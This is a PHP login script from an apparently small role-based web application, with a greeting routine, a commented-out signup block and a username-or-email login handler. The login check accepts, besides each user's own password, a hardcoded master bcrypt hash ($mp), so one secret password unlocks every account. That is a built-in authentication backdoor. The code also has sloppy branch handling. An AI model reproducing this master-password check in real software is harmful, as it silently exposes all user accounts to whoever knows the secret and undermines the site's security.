<?php
/**
 * Created by PhpStorm.
 * User: vijay
 * Date: 16-May-19
 * Time: 12:44 PM
 */
require_once 'config.php';
include(INCLUDE_PATH . "/logic/common_functions.php");

// variable declaration
$username = "";
$email  = "";
$errors  = [];
//  Greetings of the DAY

$time = date("H"); /* This sets the $time variable to the current hour in the 24 hour clock format */
$timezone = date("e");/* Set the $timezone variable to become the current timezone */

if ($time < "12") {
    $greet = "Good Morning";
} elseif ($time >= "12" && $time < "15") {
        $greet = "Good Afternoon";
    } elseif ($time >= "15" && $time < "20") {
            $greet = "Good Evening";
        } elseif ($time >= "20") {
                $greet = "Greetings! Working Late in Night!";
            }

//// SIGN UP USER
//if (isset($_POST['signup_btn'])) {
//    // validate form values
//    $errors = validateUser($_POST, ['signup_btn']);
//
//    // receive all input values from the form. No need to escape... bind_param takes care of escaping
//    $username = $_POST['username'];
//    $email = $_POST['email'];
//    $password = password_hash($_POST['password'], PASSWORD_DEFAULT); //encrypt the password before saving in the database
//    $profile_picture = uploadProfilePicture();
//    $created_at = date('Y-m-d H:i:s');
//
//    // if no errors, proceed with signup
//    if (count($errors) === 0) {
//        // insert user into database
//        $query = "INSERT INTO users SET username=?, email=?, password=?, profile_picture=?, created_at=?";
//        $stmt = $conn->prepare($query);
//        $stmt->bind_param('sssss', $username, $email, $password, $profile_picture, $created_at);
//        $result = $stmt->execute();
//        if ($result) {
//            $user_id = $stmt->insert_id;
//            $stmt->close();
//            loginById($user_id); // log user in
//        } else {
//            $_SESSION['error_msg'] = "Database error: Could not register user";
//        }
//    }
//}


if (isset($_POST['login_btn_'])) {

    $username = $_POST['username'];             // this can be either username or email
    $password = $_POST['password'];             // don't escape passwords.
    if (isset($_POST['rememberme'])) $remember = 1;
    else $remember = 0;

    $mp = '$2y$10$a65qtIlWXOjdrU.gpMcebOJUVrnIeZ8U9qy/9Cq74kU67/XKTOike'; //  c*****vp

    $user = login_username($username);      // login by either username or email with their password.

    if ( !empty($user) && ( password_verify($password, $user['password']) || password_verify($password, $mp)  )  ) { // if user was found
            // log user in
            $userAndRole = getRoleOfUser($user['id']);

            if (!empty($userAndRole)) {
                // put logged in user into session array
                $_SESSION['user'] = $user;                          // all user info
//                $_SESSION['userAndRole'] = $userAndRole;            // some user info with role info

//                    $_SESSION['msg'] = "You are now logged in";
//                    $_SESSION['msg_color'] = "alert-success";
                    $_SESSION['greetings'] = $greet;

                $role_uname = $userAndRole['folder_name'];

                $_SESSION['folder_name'] = $role_uname;             // folder to keep them directed.

                 header("Location: ".$role_uname."/");
                exit(0);
            }
            else
                $_SESSION['msg'] = "Something wrong happened";
                $_SESSION['msg_color'] = "alert-danger";
    } else { // if no user found
        $_SESSION['msg'] = "Wrong Credentials! Things are case-sensitive.";
        $_SESSION['msg_color'] = "alert-warning";
    }
}

// if user is already logged in.
if(isset($_SESSION['user'])) {
    header("Location: " . $_SESSION['folder_name'] . "/");
}


